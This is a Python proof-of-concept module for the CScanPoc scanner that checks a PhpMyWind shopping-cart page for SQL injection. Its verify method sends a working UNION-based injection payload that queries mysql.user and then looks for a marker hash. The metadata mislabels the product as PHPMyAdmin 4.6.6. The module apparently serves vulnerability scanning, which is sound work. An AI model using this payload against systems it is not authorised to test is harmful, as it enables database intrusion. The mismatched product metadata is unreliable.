# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'PHPMyAdmin_0004_p'  # 平台漏洞编号，留空
    name = 'PhpMyWind SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-12'  # 漏洞公布时间
    desc = '''
        漏洞在shoppingcart.php文件大约152行处，$goods变量是从cookie中取出的shoppingcart字段值直接反序列化后的内容，没有进行任何的过滤和校验。最终造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1146/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyAdmin'  # 漏洞应用名称
    product_version = 'PHPMyAdmin4.6.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f75a0bd9-13d9-4512-aee1-91c448d9dd68'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际环境获取payload
            payload = "/shoppingcart.php"
            data = "?a=addshopingcart&goodsid=1 and @`'` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,md5(c),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from mysql.user where 1=1 or @`'`&buynum=1&goodsattr=tpcs"
            url = self.target + payload + data
            requests.get(url)
            r = requests.get(self.target + payload)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
